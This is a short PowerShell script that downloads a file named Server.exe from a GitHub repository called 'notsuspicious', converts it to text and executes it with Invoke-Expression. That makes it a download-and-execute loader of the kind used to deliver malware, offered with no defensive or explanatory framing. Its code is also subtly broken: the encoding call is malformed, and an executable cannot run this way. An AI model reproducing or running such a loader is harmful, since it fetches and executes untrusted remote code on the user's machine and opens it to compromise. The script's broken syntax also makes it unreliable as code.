$content = Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/Server.exe'
$stringContent = [System.Text.Encoding] :: UTF-8.GetString($content.Content)

Invoke-Expression -Command $stringcontent